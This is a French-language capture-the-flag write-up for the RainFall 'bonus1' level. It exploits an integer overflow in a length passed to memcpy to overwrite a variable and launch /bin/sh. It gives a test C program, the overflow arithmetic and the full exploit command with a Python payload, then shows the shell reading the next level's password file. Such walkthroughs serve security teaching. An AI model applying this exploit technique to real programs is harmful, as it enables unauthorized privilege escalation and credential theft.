# Bonus 1
On ouvre le binaire avec cuter, et on y vois un `/bin/sh` on va devoir essayer de le lancer. le programme contiens deux condition imbriquer la premier check que le premier argument soit inférieur a 10, la seconde qui execute le `/bin/sh` et qui demande que le premier argument soit égale a  `0x574f4c46` (1464814662),  la seule faille présente c'est le `memcpy` en effet le premier argument va être multiplier par 4 avant d'être utiliser en tant que size de memcpy après être passer dans la premiere condition. Puisque le premier argument est passer dans un `atoi` qui créera un int, on peut peut donc luis passer un nombre négatif qui passera la premiere condition et pour que une fois passer dans le paramètre du `memcpy` qui le mutiplira par 4 le résultat nous donne 44. Donc pour tester ca il faut tester les dépassement d'int min. On crée donc un petit code pour tester comment tout ca ce comporte :
```c
#include  <libc.h>

int  main(int  ac,  char  **av) {
	int  a  =  atoi(av[1]);
	printf("%d\n",  a);
	return  0;
}
```
ce qui nous donne : 
```
➜  bonus1 git:(master) ✗ gcc source.c && ./a.out -2147483648 
-2147483648
➜  bonus1 git:(master) ✗ gcc source.c && ./a.out -2147483649 
2147483647
```
on voit donc que une fois que l'int min est dépasser celui-ci boucle vers int max  donc il faut donc faire : 

$$res=\frac{intMin * 2}{4} - \frac{44}{4}$$

```
(4294967295 / 4) - (44 / 4) = 1073741812
```
Nous pouvons donc passer en second paramètre 40 octets suivi de la valeur à assigner à la variable (`0x574f4c46`).
ca nous donne donc : 
```
bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ 
```
